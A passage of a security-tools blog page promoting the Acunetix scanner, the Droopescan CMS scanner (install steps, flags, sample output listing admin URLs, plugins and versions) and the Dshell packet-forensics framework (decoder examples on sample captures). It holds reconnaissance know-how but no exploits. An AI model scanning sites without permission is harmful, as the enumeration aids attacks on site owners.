       <li style="text-align: justify;">Test for weak passwords on FTP, IMAP, SQL servers, POP3, Socks, SSH, Telnet</li> 
       <li style="text-align: justify;">Check for DNS server vulnerabilities such as Open Zone Transfer, Open Recursion and Cache Poisoning</li> 
       <li style="text-align: justify;">Test FTP access such as anonymous access potential and a list of writable FTP directories</li> 
       <li style="text-align: justify;">Check for badly configured Proxy Servers, weak SNMP Community Strings, weak SSL ciphers and many other security weaknesses.</li> 
      </ul> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b>Register for a free trial and start scanning <a href="http://www.acunetix.com/free-network-security/?utm_source=hacktools&amp;utm_medium=banner&amp;utm_term=smaug&amp;utm_campaign=hacktools" target="_blank">http://www.acunetix.com/free-network-security-scanner/&nbsp;</a></b>
       <br> 
       <br> 
       <b><span style="font-size: large;">About Acunetix</span></b>
       <br> 
       <br> Acunetix is the market leader in web application security technology, founded to combat the alarming rise in web attacks. Its products and technologies are the result of a decade of work by a team of highly experienced security developers. Acunetix’ customers include the U.S. Army, KPMG, Adidas and Fujitsu. More information can be found at www.acunetix.com.
       <br> 
       <br> 
       <br>
      </div> 
      <div style="text-align: center;"> 
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="13761437549016698" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Droopescan - Scanner to identify issues with several CMSs, mainly Drupal &amp; Silverstripe  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-13761437549016698" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://1.bp.blogspot.com/-9KamNHzPWgc/Ve0QJXpqEPI/AAAAAAAAElg/CUp71rX4seU/s1600/droopscan.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="560" src="http://1.bp.blogspot.com/-9KamNHzPWgc/Ve0QJXpqEPI/AAAAAAAAElg/CUp71rX4seU/s640/droopscan.png" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        A plugin-based scanner that aids security researchers in identifying issues with several CMS:
      </div> 
      <ul> 
       <li style="text-align: justify;">Drupal.</li> 
       <li style="text-align: justify;">SilverStripe.</li> 
      </ul> 
      <div style="text-align: justify;">
        Partial functionality for:
      </div> 
      <ul> 
       <li style="text-align: justify;">Wordpress.</li> 
       <li style="text-align: justify;">Joomla.</li> 
      </ul> 
      <a name="more"></a>
      <pre><code>computer:~/droopescan$ droopescan scan drupal -u http://example.org/ -t 8
[+] No themes found.

[+] Possible interesting urls found:
    Default changelog file - https://www.example.org/CHANGELOG.txt
    Default admin - https://www.example.org/user/login

[+] Possible version(s):
    7.34

[+] Plugins found:
    views https://www.example.org/sites/all/modules/views/
        https://www.example.org/sites/all/modules/views/README.txt
        https://www.example.org/sites/all/modules/views/LICENSE.txt
    token https://www.example.org/sites/all/modules/token/
        https://www.example.org/sites/all/modules/token/README.txt
        https://www.example.org/sites/all/modules/token/LICENSE.txt
    pathauto https://www.example.org/sites/all/modules/pathauto/
        https://www.example.org/sites/all/modules/pathauto/README.txt
        https://www.example.org/sites/all/modules/pathauto/LICENSE.txt
        https://www.example.org/sites/all/modules/pathauto/API.txt
    libraries https://www.example.org/sites/all/modules/libraries/
        https://www.example.org/sites/all/modules/libraries/CHANGELOG.txt
        https://www.example.org/sites/all/modules/libraries/README.txt
        https://www.example.org/sites/all/modules/libraries/LICENSE.txt
    entity https://www.example.org/sites/all/modules/entity/
        https://www.example.org/sites/all/modules/entity/README.txt
        https://www.example.org/sites/all/modules/entity/LICENSE.txt
    google_analytics https://www.example.org/sites/all/modules/google_analytics/
        https://www.example.org/sites/all/modules/google_analytics/README.txt
        https://www.example.org/sites/all/modules/google_analytics/LICENSE.txt
    ctools https://www.example.org/sites/all/modules/ctools/
        https://www.example.org/sites/all/modules/ctools/CHANGELOG.txt
        https://www.example.org/sites/all/modules/ctools/LICENSE.txt
        https://www.example.org/sites/all/modules/ctools/API.txt
    features https://www.example.org/sites/all/modules/features/
        https://www.example.org/sites/all/modules/features/CHANGELOG.txt
        https://www.example.org/sites/all/modules/features/README.txt
        https://www.example.org/sites/all/modules/features/LICENSE.txt
        https://www.example.org/sites/all/modules/features/API.txt
    [... snip for README ...]

[+] Scan finished (0:04:59.502427 elapsed)
</code></pre> You can get a full list of options by running:
      <br> 
      <pre><code>droopescan --help
droopescan scan --help
</code></pre> 
      <br> 
      <b><span style="font-size: large;"> Why not X?</span></b>
      <br> 
      <br> Because droopescan:
      <br> 
      <ul> 
       <li>is fast</li> 
       <li>is stable</li> 
       <li>is up to date</li> 
       <li>allows simultaneous scanning of multiple sites</li> 
       <li>is 100% python</li> 
      </ul> 
      <b><span style="font-size: large;"> Installation</span></b>
      <br> 
      <br> Installation is easy using pip:
      <br> 
      <pre><code>apt-get install python-pip
pip install droopescan
</code></pre> 
      <br> Manual installation is as follows:
      <br> 
      <pre><code>git clone https://github.com/droope/droopescan.git
cd droopescan
pip install -r requirements.txt
droopescan scan --help
</code></pre> 
      <div style="text-align: justify;">
        The master branch corresponds to the latest release (what is in pypi). Development branch is unstable and all pull requests must be made against it. More notes regarding installation can be 
       <a href="https://droope.github.io/droopescan-docs/_build/html/installation.html">found here</a>.
      </div> 
      <br> 
      <b><span style="font-size: large;">Features</span></b> 
      <br> 
      <br> 
      <b> Scan types.</b>
      <br> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Droopescan aims to be the most accurate by default, while not overloading the target server due to excessive concurrent requests. Due to this, by default, a large number of requests will be made with four threads; change these settings by using the 
       <code>--number</code> and 
       <code>--threads</code> arguments respectively.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        This tool is able to perform four kinds of tests. By default all tests are ran, but you can specify one of the following with the 
       <code>-e</code> or 
       <code>--enumerate</code> flag:
      </div> 
      <ul> 
       <li>p -- <em>Plugin checks</em>: Performs several thousand HTTP requests and returns a listing of all plugins found to be installed in the target host.</li> 
       <li>t -- <em>Theme checks</em>: As above, but for themes.</li> 
       <li>v -- <em>Version checks</em>: Downloads several files and, based on the checksums of these files, returns a list of all possible versions.</li> 
       <li>i -- <em>Interesting url checks</em>: Checks for interesting urls (admin panels, readme files, etc.)</li> 
      </ul> More notes regarding scanning can be 
      <a href="https://droope.github.io/droopescan-docs/_build/html/intro.html">found here</a>.
      <br> 
      <br> 
      <b> Target specification</b>
      <br> 
      <br> You can specify a particular host to scan by passing the 
      <code>-u</code> or 
      <code>--url</code> parameter:
      <br> 
      <pre><code>    droopescan scan drupal -u example.org
</code></pre> You can also omit the 
      <code>drupal</code> argument. This will trigger “CMS identification”, like so:
      <br> 
      <pre><code>    droopescan scan -u example.org
</code></pre> Multiple URLs may be scanned utilising the 
      <code>-U</code> or 
      <code>--url-file</code> parameter. This parameter should be set to the path of a file which contains a list of URLs. 
      <br> 
      <pre><code>    droopescan scan drupal -U list_of_urls.txt
</code></pre> 
      <div style="text-align: justify;">
        The 
       <code>drupal</code> parameter may also be ommited in this example. For each site, it will make several GET requests in order to perform CMS identification, and if the site is deemed to be a supported CMS, it is scanned and added to the output list. This can be useful, for example, to run 
       <code>droopescan</code> across all your organisation's sites.
      </div> 
      <pre><code>    droopescan scan -U list_of_urls.txt
</code></pre> The code block below contains an example list of URLs, one per line:
      <br> 
      <pre><code>http://localhost/drupal/6.0/
http://localhost/drupal/6.1/
http://localhost/drupal/6.10/
http://localhost/drupal/6.11/
http://localhost/drupal/6.12/
</code></pre> 
      <div style="text-align: justify;">
        A file containing URLs and a value to override the default host header with separated by tabs or spaces is also OK for URL files. This can be handy when conducting a scan through a large range of hosts and you want to prevent unnecessary DNS queries. To clarify, an example below:
      </div> 
      <pre><code>192.168.1.1 example.org
http://192.168.1.1/ example.org
http://192.168.1.2/drupal/  example.org
</code></pre> 
      <div style="text-align: justify;">
        It is quite tempting to test whether the scanner works for a particular CMS by scanning the official site (e.g. 
       <code>wordpress.org</code> for 
       <code>wordpress</code>), but the official sites rarely run vainilla installations of their respective CMS or do unorthodox things. For example, 
       <code>wordpress.org</code> runs the bleeding edge version of 
       <code>wordpress</code>, which will not be identified as wordpress by 
       <code>droopescan</code> at all because the checksums do not match any known wordpress version.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <b> Authentication</b>
      <br> 
      <br> 
      <div style="text-align: justify;">
        The application fully supports 
       <code>.netrc</code> files and 
       <code>http_proxy</code> environment variables.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        You can set the 
       <code>http_proxy</code> and 
       <code>https_proxy</code> variables. These allow you to set a parent HTTP proxy, in which you can handle more complex types of authentication (e.g. Fiddler, ZAP, Burp)
      </div> 
      <pre><code>export http_proxy='user:<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="7000110303071f0214301c1f13111c181f0304">[email&nbsp;protected]</a>:8080'
export https_proxy='user:<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="deaebfadada9b1acba9eb2b1bdbfb2b6b1adaa">[email&nbsp;protected]</a>:8080'
droopescan scan drupal --url http://localhost/drupal
</code></pre> Another option is to use a .netrc file for basic authentication. An example 
      <code>~/.netrc</code> file could look as follows:
      <br> 
      <pre><code>machine secret.google.com
    login <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="e786838a8e89a7808888808b82c984888a">[email&nbsp;protected]</a>
    password Winter01
</code></pre> 
      <em>WARNING:</em> By design, to allow intercepting proxies and the testing of applications with bad SSL, droopescan allows self-signed or otherwise invalid certificates. ?????
      <br> 
      <br> 
      <b> Output</b>
      <br> 
      <br> This application supports both "standard output", meant for human consumption, or JSON, which is more suitable for machine consumption. This output is stable between major versions.
      <br> This can be controlled with the 
      <code>--output</code> flag. Some sample JSON output would look as follows (minus the excessive whitespace):
      <br> 
      <pre><code>{
  "themes": {
    "is_empty": true,
    "finds": [

    ]
  },
  "interesting urls": {
    "is_empty": false,
    "finds": [
      {
        "url": "https:\/\/www.drupal.org\/CHANGELOG.txt",
        "description": "Default changelog file."
      },
      {
        "url": "https:\/\/www.drupal.org\/user\/login",
        "description": "Default admin."
      }
    ]
  },
  "version": {
    "is_empty": false,
    "finds": [
      "7.29",
      "7.30",
      "7.31"
    ]
  },
  "plugins": {
    "is_empty": false,
    "finds": [
      {
        "url": "https:\/\/www.drupal.org\/sites\/all\/modules\/views\/",
        "name": "views"
      },
      [...snip...]
    ]
  }
}
</code></pre> Some attributes might be missing from the JSON object if parts of the scan are not ran.
      <br> This is how multi-site output looks like; each line contains a valid JSON object as shown above.
      <br> 
      <br> 
      <pre><code>    $ droopescan scan drupal -U six_and_above.txt -e v
    {"host": "http://localhost/drupal-7.6/", "version": {"is_empty": false, "finds": ["7.6"]}}
    {"host": "http://localhost/drupal-7.7/", "version": {"is_empty": false, "finds": ["7.7"]}}
    {"host": "http://localhost/drupal-7.8/", "version": {"is_empty": false, "finds": ["7.8"]}}
    {"host": "http://localhost/drupal-7.9/", "version": {"is_empty": false, "finds": ["7.9"]}}
    {"host": "http://localhost/drupal-7.10/", "version": {"is_empty": false, "finds": ["7.10"]}}
    {"host": "http://localhost/drupal-7.11/", "version": {"is_empty": false, "finds": ["7.11"]}}
    {"host": "http://localhost/drupal-7.12/", "version": {"is_empty": false, "finds": ["7.12"]}}
    {"host": "http://localhost/drupal-7.13/", "version": {"is_empty": false, "finds": ["7.13"]}}
    {"host": "http://localhost/drupal-7.14/", "version": {"is_empty": false, "finds": ["7.14"]}}
    {"host": "http://localhost/drupal-7.15/", "version": {"is_empty": false, "finds": ["7.15"]}}
    {"host": "http://localhost/drupal-7.16/", "version": {"is_empty": false, "finds": ["7.16"]}}
    {"host": "http://localhost/drupal-7.17/", "version": {"is_empty": false, "finds": ["7.17"]}}
    {"host": "http://localhost/drupal-7.18/", "version": {"is_empty": false, "finds": ["7.18"]}}
    {"host": "http://localhost/drupal-7.19/", "version": {"is_empty": false, "finds": ["7.19"]}}
    {"host": "http://localhost/drupal-7.20/", "version": {"is_empty": false, "finds": ["7.20"]}}
    {"host": "http://localhost/drupal-7.21/", "version": {"is_empty": false, "finds": ["7.21"]}}
    {"host": "http://localhost/drupal-7.22/", "version": {"is_empty": false, "finds": ["7.22"]}}
    {"host": "http://localhost/drupal-7.23/", "version": {"is_empty": false, "finds": ["7.23"]}}
    {"host": "http://localhost/drupal-7.24/", "version": {"is_empty": false, "finds": ["7.24"]}}
    {"host": "http://localhost/drupal-7.25/", "version": {"is_empty": false, "finds": ["7.25"]}}
    {"host": "http://localhost/drupal-7.26/", "version": {"is_empty": false, "finds": ["7.26"]}}
    {"host": "http://localhost/drupal-7.27/", "version": {"is_empty": false, "finds": ["7.27"]}}
    {"host": "http://localhost/drupal-7.28/", "version": {"is_empty": false, "finds": ["7.28"]}}
    {"host": "http://localhost/drupal-7.29/", "version": {"is_empty": false, "finds": ["7.29"]}}
    {"host": "http://localhost/drupal-7.30/", "version": {"is_empty": false, "finds": ["7.30"]}}
    {"host": "http://localhost/drupal-7.31/", "version": {"is_empty": false, "finds": ["7.31"]}}
    {"host": "http://localhost/drupal-7.32/", "version": {"is_empty": false, "finds": ["7.32"]}}
    {"host": "http://localhost/drupal-7.33/", "version": {"is_empty": false, "finds": ["7.33"]}}
    {"host": "http://localhost/drupal-7.34/", "version": {"is_empty": false, "finds": ["7.34"]}}
</code></pre> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/droope/droopescan" target="_blank">Download Droopescan</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="2723524603749841460" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Dshell - Network Forensic Analysis Framework  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-2723524603749841460" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://1.bp.blogspot.com/-LfddptLAGOA/VNelnv8MphI/AAAAAAAADqs/qKMZD5dVlW0/s1600/dshell.jpeg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-LfddptLAGOA/VNelnv8MphI/AAAAAAAADqs/qKMZD5dVlW0/s1600/dshell.jpeg" height="480" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        An extensible network forensic analysis framework. Enables rapid development of plugins to support the dissection of network packet captures. 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b>Key features:</b>
      </div> 
      <ul class="task-list"> 
       <li style="text-align: justify;">Robust stream reassembly </li> 
       <li style="text-align: justify;">IPv4 and IPv6 support</li> 
       <li style="text-align: justify;">Custom output handlers</li> 
       <li style="text-align: justify;">Chainable decoders</li> 
      </ul> 
      <div> 
       <div style="text-align: justify;"> 
       </div> 
       <a name="more"></a>
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;">Prerequisites</span></b>
      </div> 
      <ul class="task-list"> 
       <li style="text-align: justify;">Linux (developed on Ubuntu 12.04)</li> 
       <li style="text-align: justify;">Python 2.7</li> 
       <li>
        <div style="text-align: justify;"> 
         <a href="https://github.com/appliedsec/pygeoip">pygeoip</a>, GNU Lesser GPL
        </div> 
        <ul class="task-list"> 
         <li style="text-align: justify;"><a href="http://dev.maxmind.com/geoip/legacy/geolite/">MaxMind GeoIP Legacy datasets</a></li> 
        </ul> </li> 
       <li style="text-align: justify;"> <a href="https://pypi.python.org/pypi/pycrypto">PyCrypto</a>, custom license</li> 
       <li style="text-align: justify;"> <a href="https://code.google.com/p/dpkt/">dpkt</a>, New BSD License</li> 
       <li style="text-align: justify;"> <a href="https://github.com/haypo/python-ipy">IPy</a>, BSD 2-Clause License</li> 
       <li style="text-align: justify;"> <a href="https://code.google.com/p/pypcap/">pypcap</a>, New BSD License</li> 
      </ul> 
      <div> 
       <div style="text-align: justify;"> 
        <br>
       </div> 
      </div> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;">Installation</span></b>
      </div> 
      <ol class="task-list"> 
       <li>
        <div style="text-align: justify;">
          Install all of the necessary Python modules listed above. Many of them are available via pip and/or apt-get. Pygeoip is not yet available as a package and must be installed with pip or manually. All except dpkt are available with pip.
        </div> 
        <ol class="task-list"> 
         <li style="text-align: justify;"><code>sudo apt-get install python-crypto python-dpkt python-ipy python-pypcap</code></li> 
         <li style="text-align: justify;"><code>sudo pip install pygeoip</code></li> 
        </ol> </li> 
       <li style="text-align: justify;">Configure pygeoip by moving the MaxMind data files (GeoIP.dat, GeoIPv6.dat, GeoIPASNum.dat, GeoIPASNumv6.dat) to /share/GeoIP/</li> 
       <li style="text-align: justify;">Run <code>make</code>. This will build Dshell.</li> 
       <li style="text-align: justify;">Run <code>./dshell</code>. This is Dshell. If you get a Dshell&gt; prompt, you're good to go!</li> 
      </ol> 
      <br> 
      <b><span style="font-size: large;">Basic usage</span></b>
      <br> 
      <ul class="task-list"> 
       <li> <code>decode -l</code> 
        <ul class="task-list"> 
         <li>This will list all available decoders alongside basic information about them</li> 
        </ul> </li> 
       <li> <code>decode -h</code> 
        <ul class="task-list"> 
         <li>Show generic command-line flags available to most decoders</li> 
        </ul> </li> 
       <li> <code>decode -d &lt;decoder&gt;</code> 
        <ul class="task-list"> 
         <li>Display information about a decoder, including available command-line flags</li> 
        </ul> </li> 
       <li> <code>decode -d &lt;decoder&gt; &lt;pcap&gt;</code> 
        <ul class="task-list"> 
         <li>Run the selected decoder on a pcap file</li> 
        </ul> </li> 
      </ul> 
      <br> 
      <b><span style="font-size: large;">Usage Examples</span></b>
      <br> 
      <br> Showing DNS lookups in 
      <a href="http://wiki.wireshark.org/SampleCaptures#General_.2F_Unsorted">sample traffic</a>
      <br> 
      <pre><code>Dshell&gt; decode -d dns ~/pcap/dns.cap
dns 2005-03-30 03:47:46    192.168.170.8:32795 -&gt;   192.168.170.20:53    ** 39867 PTR? 66.192.9.104 / PTR: 66-192-9-104.gen.twtelecom.net **
dns 2005-03-30 03:47:46    192.168.170.8:32795 -&gt;   192.168.170.20:53    ** 30144 A? www.netbsd.org / A: 204.152.190.12 (ttl 82159s) **
dns 2005-03-30 03:47:46    192.168.170.8:32795 -&gt;   192.168.170.20:53    ** 61652 AAAA? www.netbsd.org / AAAA: 2001:4f8:4:7:2e0:81ff:fe52:9a6b (ttl 86400s) **
dns 2005-03-30 03:47:46    192.168.170.8:32795 -&gt;   192.168.170.20:53    ** 32569 AAAA? www.netbsd.org / AAAA: 2001:4f8:4:7:2e0:81ff:fe52:9a6b (ttl 86340s) **
dns 2005-03-30 03:47:46    192.168.170.8:32795 -&gt;   192.168.170.20:53    ** 36275 AAAA? www.google.com / CNAME: www.l.google.com **
dns 2005-03-30 03:47:46    192.168.170.8:32795 -&gt;   192.168.170.20:53    ** 9837 AAAA? www.example.notginh / NXDOMAIN **
dns 2005-03-30 03:52:17    192.168.170.8:32796 &lt;-   192.168.170.20:53    ** 23123 PTR? 127.0.0.1 / PTR: localhost **
dns 2005-03-30 03:52:25   192.168.170.56:1711  &lt;-      217.13.4.24:53    ** 30307 A? GRIMM.utelsystems.local / NXDOMAIN **
dns 2005-03-30 03:52:17   192.168.170.56:1710  &lt;-      217.13.4.24:53    ** 53344 A? GRIMM.utelsystems.local / NXDOMAIN **
</code></pre> Following and reassembling a stream in 
      <a href="http://wiki.wireshark.org/SampleCaptures#General_.2F_Unsorted">sample traffic</a>
      <br> 
      <pre><code>Dshell&gt; decode -d followstream ~/pcap/v6-http.cap
Connection 1 (TCP)
Start: 2007-08-05 19:16:44.189852 UTC
  End: 2007-08-05 19:16:44.204687 UTC
2001:6f8:102d:0:2d0:9ff:fee3:e8de:59201 -&gt; 2001:6f8:900:7c0::2:80 (240 bytes)
2001:6f8:900:7c0::2:80 -&gt; 2001:6f8:102d:0:2d0:9ff:fee3:e8de:59201 (2259 bytes)

GET / HTTP/1.0
Host: cl-1985.ham-01.de.sixxs.net
Accept: text/html, text/plain, text/css, text/sgml, */*;q=0.01
Accept-Encoding: gzip, bzip2
Accept-Language: en
User-Agent: Lynx/2.8.6rel.2 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8b

HTTP/1.1 200 OK
Date: Sun, 05 Aug 2007 19:16:44 GMT
Server: Apache
Content-Length: 2121
Connection: close
Content-Type: text/html

&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
&lt;html&gt;
 &lt;head&gt;
  &lt;title&gt;Index of /&lt;/title&gt;
 &lt;/head&gt;
 &lt;body&gt;
&lt;h1&gt;Index of /&lt;/h1&gt;
&lt;pre&gt;&lt;img src="/icons/blank.gif" alt="Icon "&gt; &lt;a href="?C=N;O=D"&gt;Name&lt;/a&gt;                    &lt;a href="?C=M;O=A"&gt;Last modified&lt;/a&gt;      &lt;a href="?C=S;O=A"&gt;Size&lt;/a&gt;  &lt;a href="?C=D;O=A"&gt;Description&lt;/a&gt;&lt;hr&gt;&lt;img src="/icons/folder.gif" alt="[DIR]"&gt; &lt;a href="202-vorbereitung/"&gt;202-vorbereitung/&lt;/a&gt;       06-Jul-2007 14:31    -   
&lt;img src="/icons/layout.gif" alt="[   ]"&gt; &lt;a href="Efficient_Video_on_demand_over_Multicast.pdf"&gt;Efficient_Video_on_d..&amp;gt;&lt;/a&gt; 19-Dec-2006 03:17  291K  
&lt;img src="/icons/unknown.gif" alt="[   ]"&gt; &lt;a href="Welcome%20Stranger!!!"&gt;Welcome Stranger!!!&lt;/a&gt;     28-Dec-2006 03:46    0   
&lt;img src="/icons/text.gif" alt="[TXT]"&gt; &lt;a href="barschel.htm"&gt;barschel.htm&lt;/a&gt;            31-Jul-2007 02:21   44K  
&lt;img src="/icons/folder.gif" alt="[DIR]"&gt; &lt;a href="bnd/"&gt;bnd/&lt;/a&gt;                    30-Dec-2006 08:59    -   
&lt;img src="/icons/folder.gif" alt="[DIR]"&gt; &lt;a href="cia/"&gt;cia/&lt;/a&gt;                    28-Jun-2007 00:04    -   
&lt;img src="/icons/layout.gif" alt="[   ]"&gt; &lt;a href="cisco_ccna_640-801_command_reference_guide.pdf"&gt;cisco_ccna_640-801_c..&amp;gt;&lt;/a&gt; 28-Dec-2006 03:48  236K  
&lt;img src="/icons/folder.gif" alt="[DIR]"&gt; &lt;a href="doc/"&gt;doc/&lt;/a&gt;                    19-Sep-2006 01:43    -

&lt;img src="/icons/folder.gif" alt="[DIR]"&gt; &lt;a href="mp3_technosets/"&gt;mp3_technosets/&lt;/a&gt;         04-Jul-2007 08:56    -   
&lt;img src="/icons/text.gif" alt="[TXT]"&gt; &lt;a href="neues_von_rainald_goetz.htm"&gt;neues_von_rainald_go..&amp;gt;&lt;/a&gt; 21-Mar-2007 23:27   31K  
&lt;img src="/icons/text.gif" alt="[TXT]"&gt; &lt;a href="neues_von_rainald_goetz0.htm"&gt;neues_von_rainald_go..&amp;gt;&lt;/a&gt; 21-Mar-2007 23:29   36K  
&lt;img src="/icons/layout.gif" alt="[   ]"&gt; &lt;a href="pruef.pdf"&gt;pruef.pdf&lt;/a&gt;               28-Dec-2006 07:48   88K  
&lt;hr&gt;&lt;/pre&gt;
&lt;/body&gt;&lt;/html&gt;
</code></pre> Chaining decoders to view flow data for a specific country code in 
      <a href="http://wiki.wireshark.org/SampleCaptures#General_.2F_Unsorted">sample traffic</a> (note: TCP handshakes are not included in the packet count)
      <br> 
      <pre><code>Dshell&gt; decode -d country+netflow --country_code=JP ~/pcap/SkypeIRC.cap
2006-08-25 19:32:20.651502       192.168.1.2 -&gt;  202.232.205.123  (-- -&gt; JP)  UDP   60583   33436     1      0       36        0  0.0000s
2006-08-25 19:32:20.766761       192.168.1.2 -&gt;  202.232.205.123  (-- -&gt; JP)  UDP   60583   33438     1      0       36        0  0.0000s
2006-08-25 19:32:20.634046       192.168.1.2 -&gt;  202.232.205.123  (-- -&gt; JP)  UDP   60583   33435     1      0       36        0  0.0000s
2006-08-25 19:32:20.747503       192.168.1.2 -&gt;  202.232.205.123  (-- -&gt; JP)  UDP   60583   33437     1      0       36        0  0.0000s
</code></pre> Collecting netflow data for 
      <a href="http://wiki.wireshark.org/SampleCaptures#General_.2F_Unsorted">sample traffic</a> with vlan headers, then tracking the connection to a specific IP address
      <br> 
      <br> 
      <pre><code>Dshell&gt; decode -d netflow ~/pcap/vlan.cap
1999-11-05 18:20:43.170500    131.151.20.254 -&gt;  255.255.255.255  (US -&gt; --)  UDP     520     520     1      0       24        0  0.0000s
1999-11-05 18:20:42.063074     131.151.32.71 -&gt;   131.151.32.255  (US -&gt; US)  UDP     138     138     1      0      201        0  0.0000s
1999-11-05 18:20:43.096540     131.151.1.254 -&gt;  255.255.255.255  (US -&gt; --)  UDP     520     520     1      0       24        0  0.0000s
1999-11-05 18:20:43.079765     131.151.5.254 -&gt;  255.255.255.255  (US -&gt; --)  UDP     520     520     1      0       24        0  0.0000s
1999-11-05 18:20:41.521798    131.151.104.96 -&gt;  131.151.107.255  (US -&gt; US)  UDP     137     137     3      0      150        0  1.5020s
1999-11-05 18:20:43.087010     131.151.6.254 -&gt;  255.255.255.255  (US -&gt; --)  UDP     520     520     1      0       24        0  0.0000s
1999-11-05 18:20:43.368210   131.151.111.254 -&gt;  255.255.255.255  (US -&gt; --)  UDP     520     520     1      0       24        0  0.0000s
1999-11-05 18:20:43.250410    131.151.32.254 -&gt;  255.255.255.255  (US -&gt; --)  UDP     520     520     1      0       24        0  0.0000s
1999-11-05 18:20:43.115330    131.151.10.254 -&gt;  255.255.255.255  (US -&gt; --)  UDP     520     520     1      0       24        0  0.0000s
1999-11-05 18:20:43.375145   131.151.115.254 -&gt;  255.255.255.255  (US -&gt; --)  UDP     520     520     1      0       24        0  0.0000s

1999-11-05 18:20:43.183825     131.151.32.79 -&gt;   131.151.32.255  (US -&gt; US)  UDP     138     138     1      0      201        0  0.0000s
</code></pre> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/USArmyResearchLab/Dshell" target="_blank">Download Dshell</a></span></b>
      </div>
